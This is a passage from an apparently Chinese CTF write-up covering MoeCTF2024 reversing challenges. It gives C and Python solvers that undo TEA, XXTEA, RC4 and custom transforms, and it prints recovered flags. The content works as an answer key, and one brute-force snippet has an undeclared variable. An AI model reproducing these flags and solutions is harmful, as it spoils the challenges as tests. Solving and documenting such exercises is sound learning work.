class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">855655493</span>, sum = delta * (<span class="hljs-number">-32</span>);<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-comment">//uint32_t enc[] = &#123;0xA3, 0x69, 0x96, 0x26, 0xBD, 0x78, 0x0B, 0x3D, 0x9D, 0xA5, 0x28, 0x62&#125;;</span><br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">0x269669a3</span>, <span class="hljs-number">0x3d0b78bd</span>, <span class="hljs-number">0x6228a59d</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>; i&gt;=<span class="hljs-number">0</span>; i-=<span class="hljs-number">1</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//moectf2024!!</span><br></code></pre></td></tr></table></figure>

<h2 id="d0tN3t"><a href="#d0tN3t" class="headerlink" title="d0tN3t"></a>d0tN3t</h2><p>dnspy打开找到main</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724070504922-2f26684c-27cd-46cf-b0bb-34818b25de07.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>有部分不可见字符记得这样处理</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724070539054-06914e00-9eae-4a64-a78c-c3cbe94b80f7.png" srcset="/img/loading.gif" lazyload class="" title="img">

<h2 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h2><p>两位一组是密文</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134162023-5d4880da-855e-43ea-a0b3-e897d861cf92.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">167</span>, <span class="hljs-number">26</span>, <span class="hljs-number">104</span>, <span class="hljs-number">236</span>, <span class="hljs-number">216</span>, <span class="hljs-number">39</span>, <span class="hljs-number">17</span>, <span class="hljs-number">204</span>, <span class="hljs-number">140</span>, <span class="hljs-number">155</span>, <span class="hljs-number">22</span>, <span class="hljs-number">21</span>, <span class="hljs-number">92</span>, <span class="hljs-number">210</span>, <span class="hljs-number">103</span>, <span class="hljs-number">62</span>, <span class="hljs-number">130</span>, <span class="hljs-number">173</span>, <span class="hljs-number">206</span>, <span class="hljs-number">117</span>, <span class="hljs-number">212</span>, <span class="hljs-number">188</span>, <span class="hljs-number">87</span>, <span class="hljs-number">86</span>, <span class="hljs-number">194</span>, <span class="hljs-number">138</span>, <span class="hljs-number">82</span>, <span class="hljs-number">184</span>, <span class="hljs-number">107</span>, <span class="hljs-number">214</span>, <span class="hljs-number">204</span>, <span class="hljs-number">248</span>, <span class="hljs-number">164</span>, <span class="hljs-number">186</span>, <span class="hljs-number">114</span>, <span class="hljs-number">47</span>, <span class="hljs-number">224</span>, <span class="hljs-number">87</span>, <span class="hljs-number">21</span>, <span class="hljs-number">185</span>, <span class="hljs-number">36</span>, <span class="hljs-number">17</span>])<br>key = <span class="hljs-string">b&#x27;RC4_1s_4w3s0m3&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure>

<h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><p>前三个key题目提示了</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134016809-38a78bb2-b62d-4b60-9f41-46c94c599146.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>明显的xxtea无魔改</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134037564-32a76006-a2cf-4e55-90f8-55220d070aa7.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) &#123;         <br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++) &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>) &#123;  <br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">9</span>] = &#123;<span class="hljs-number">0x78e1f564</span>,<span class="hljs-number">0xa835f0e1</span>,<span class="hljs-number">0x512ff34</span>,<span class="hljs-number">0xb0e913fb</span>,<span class="hljs-number">0x89b9a350</span>,<span class="hljs-number">0xc943dab1</span>,<span class="hljs-number">0x1dbc84f</span>,<span class="hljs-number">0xaf16db20</span>,<span class="hljs-number">0x961767ed</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x63656f6d</span>,<span class="hljs-number">0x30326674</span>,<span class="hljs-number">0x21213432</span>,<span class="hljs-number">0xCCFFBBBB</span>&#125;;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">9</span>;<br>    btea(v, -n, k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i ++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">8</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">16</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h2><p>输入不明确但是可以猜测</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273913162-1f2fc05c-7205-4979-b6ca-8a5f6cda1c6f.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273875357-9cc404c0-2560-4986-b82d-85afe80b2650.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">moectf</span>&#123;<span class="hljs-number">836153</span>a5-<span class="hljs-number">8</span>e00-<span class="hljs-number">49</span>bd-<span class="hljs-number">9</span>c42-caf30620caaf&#125;<br></code></pre></td></tr></table></figure>

<h2 id="进阶指北"><a href="#进阶指北" class="headerlink" title="进阶指北"></a>进阶指北</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723272863336-615d073c-62bf-4b9d-8449-0d4ac9ea810c.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>先用python求出乘法逆元，注意+优先级要高于^</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0xb5073388</span> , <span class="hljs-number">0xf58ea46f</span> , <span class="hljs-number">0x8cd2d760</span> , <span class="hljs-number">0x7fc56cda</span> , <span class="hljs-number">0x52bc07da</span> , <span class="hljs-number">0x29054b48</span> ,<br>	<span class="hljs-number">0x42d74750</span> , <span class="hljs-number">0x11297e95</span> , <span class="hljs-number">0x5cf2821b</span> , <span class="hljs-number">0x747970da</span> , <span class="hljs-number">0x64793c81</span>&#125;;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>		a[i]=(((a[i]^ (<span class="hljs-number">0xd3906</span>+<span class="hljs-number">0xdeadbeef</span>))- <span class="hljs-number">0xdeadc0de</span>))*<span class="hljs-number">0x8d61d173</span>;<br>	&#125;<br>	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">4</span>;j++)&#123;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(a[i]&gt;&gt;(<span class="hljs-number">8</span>*j))&amp;<span class="hljs-number">0xff</span>);<br>		&#125;<br>		<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>或者用爆破的方式，c爆破速度明显比python快</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0xb5073388</span> , <span class="hljs-number">0xf58ea46f</span> , <span class="hljs-number">0x8cd2d760</span> , <span class="hljs-number">0x7fc56cda</span> , <span class="hljs-number">0x52bc07da</span> , <span class="hljs-number">0x29054b48</span> ,<br>                      <span class="hljs-number">0x42d74750</span> , <span class="hljs-number">0x11297e95</span> , <span class="hljs-number">0x5cf2821b</span> , <span class="hljs-number">0x747970da</span> , <span class="hljs-number">0x64793c81</span>&#125;;<br>    <span class="hljs-type">int</span> c[<span class="hljs-number">11</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>        <span class="hljs-keyword">for</span> (m=<span class="hljs-number">0x20202020</span>;m&lt;=<span class="hljs-number">0x7d7d7d7d</span>;m++)&#123;<br>            <span class="hljs-type">int</span> b=(m* <span class="hljs-number">0xccffbbbb</span> + <span class="hljs-number">0xdeadc0de</span>) ^ <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xd3906</span>;<br><br>            <span class="hljs-keyword">if</span>(b==a[i])&#123;<br>                <span class="hljs-comment">//printf(&quot;%x,&quot;,(m* 0xccffbbbb + 0xdeadc0de) ^ 0xdeadbeef + 0xd3906);</span><br>                <span class="hljs-comment">//printf(&quot;%x,&quot;,m);</span><br>                c[i]=m;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">4</span>;j++)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(c[i]&gt;&gt;(<span class="hljs-number">8</span>*j))&amp;<span class="hljs-number">0xff</span>);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//moectf&#123;c5f44c32-cbb9-444e-aef4-c0fa7c7a6b7a&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="moedaily"><a href="#moedaily" class="headerlink" title="moedaily"></a>moedaily</h2><p>这题比较创新，用excel实现了tea，注意64次循环，且32次之后sum要重置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">114514</span>, sum = delta * <span class="hljs-number">32</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">415144</span>)^(((v0&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">19883</span>)^(v0+sum));<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">114514</span>)^(((v1&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">1919810</span>)^(v1+sum));<br>        sum-=<span class="hljs-number">114514</span>; <br>    &#125;<br>    sum = delta * <span class="hljs-number">32</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">415144</span>)^(((v0&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">19883</span>)^(v0+sum));<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">114514</span>)^(((v1&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">1919810</span>)^(v1+sum));<br>        sum-=<span class="hljs-number">114514</span>; <br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x5377654E</span>,<span class="hljs-number">0x21726174</span>,<span class="hljs-number">0x5377654E</span>,<span class="hljs-number">0x21726174</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">1397140385</span>,<span class="hljs-number">2386659843</span>,<span class="hljs-number">962571399</span>,<span class="hljs-number">3942687964</span>,<span class="hljs-number">3691974192</span>,<span class="hljs-number">863943258</span>,<span class="hljs-number">216887638</span>,<span class="hljs-number">3212824238</span>,<span class="hljs-number">3802077983</span>,<span class="hljs-number">1839161422</span>,<span class="hljs-number">1288683919</span>,<span class="hljs-number">3222915626</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">12</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//sum=0</span><br><span class="hljs-comment">//IF(LEN(D11)=48,IF(AND(AND(AND(AND(AND(AND(H14=1397140385,I14=2386659843),AND(H15=962571399,I15=3942687964)),AND(H16=3691974192,I16=863943258)),AND(H17=216887638,I17=3212824238)),AND(H18=3802077983,I18=1839161422)),AND(H19=1288683919,I19=3222915626)),&quot;恭喜你，拿到了真的FLAG&quot;,&quot;FLAG输入错了，再试试&quot;),&quot;flag长度不对&quot;)</span><br><span class="hljs-comment">//sum+=114514</span><br><span class="hljs-comment">//v0+=((v1&lt;&lt;4+114514)^((v1&gt;&gt;5+1919810)^(v1+sum)))&amp;0xffffffff</span><br><span class="hljs-comment">//v1+=((v0&lt;&lt;4+415144)^((v0&gt;&gt;5+19883)^(v0+sum)))&amp;0xffffffff</span><br></code></pre></td></tr></table></figure>

<h2 id="moejvav"><a href="#moejvav" class="headerlink" title="moejvav"></a>moejvav</h2><p>给的命令是运行用的</p>
<p>vm题，但是可以自己模拟一下</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724136823247-4cdf7e68-d4fa-4e52-bb58-18b8af598597.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#(input^202)+32</span><br><span class="hljs-comment">#^60-20</span><br>a=[-<span class="hljs-number">25</span>,-<span class="hljs-number">27</span>,-<span class="hljs-number">33</span>,-<span class="hljs-number">31</span>,-<span class="hljs-number">50</span>,-<span class="hljs-number">36</span>,-<span class="hljs-number">39</span>,-<span class="hljs-number">24</span>,-<span class="hljs-number">52</span>,-<span class="hljs-number">29</span>,-<span class="hljs-number">52</span>]<br><span class="hljs-comment">#^14+5</span><br>b=[-<span class="hljs-number">64</span>,-<span class="hljs-number">58</span>,-<span class="hljs-number">63</span>,-<span class="hljs-number">52</span>,-<span class="hljs-number">90</span>,-<span class="hljs-number">39</span>,-<span class="hljs-number">43</span>,<span class="hljs-number">26</span>,<span class="hljs-number">25</span>,-<span class="hljs-number">49</span>,-<span class="hljs-number">64</span>]<br><span class="hljs-comment">#^10+5</span><br>c=[-<span class="hljs-number">51</span>,<span class="hljs-number">25</span>,-<span class="hljs-number">45</span>,-<span class="hljs-number">55</span>,-<span class="hljs-number">47</span>,<span class="hljs-number">24</span>,-<span class="hljs-number">41</span>,-<span class="hljs-number">60</span>,<span class="hljs-number">22</span>,-<span class="hljs-number">40</span>,-<span class="hljs-number">60</span>]<br><span class="hljs-comment">#+24</span><br>d=[-<span class="hljs-number">15</span>,<span class="hljs-number">50</span>,-<span class="hljs-number">51</span>,-<span class="hljs-number">31</span>,<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,-<span class="hljs-number">35</span>,<span class="hljs-number">50</span>,-<span class="hljs-number">35</span>,<span class="hljs-number">51</span>,-<span class="hljs-number">17</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(b))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(d))<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>((((((a[i]+<span class="hljs-number">20</span>)^<span class="hljs-number">60</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span 